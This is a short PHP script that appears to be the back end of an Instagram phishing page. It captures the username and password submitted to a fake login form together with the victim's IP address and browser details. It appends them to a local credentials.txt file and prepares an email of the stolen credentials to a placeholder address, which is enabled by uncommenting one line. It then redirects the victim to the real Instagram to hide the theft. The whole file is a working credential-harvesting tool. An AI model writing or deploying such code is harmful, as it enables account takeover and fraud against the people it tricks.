<?php
if ($_POST) {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'] ?? '';
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $timestamp = date('Y-m-d H:i:s');
    
    // Log credentials to file
    $log_entry = "[$timestamp] IP: $ip | UA: $user_agent | Username: $username | Password: $password\n";
    file_put_contents('credentials.txt', $log_entry, FILE_APPEND | LOCK_EX);
    
    // Email credentials (configure your SMTP)
    $to = 'your@email.com';
    $subject = 'Instagram Credentials Captured';
    $message = "New credentials:\nIP: $ip\nUser-Agent: $user_agent\nUsername: $username\nPassword: $password\nTime: $timestamp";
    $headers = 'From: noreply@yourdomain.com' . "\r\n";
    
    // mail($to, $subject, $message, $headers); // Uncomment for email
    
    // Redirect to real Instagram
    header('Location: https://www.instagram.com');
    exit;
}
?>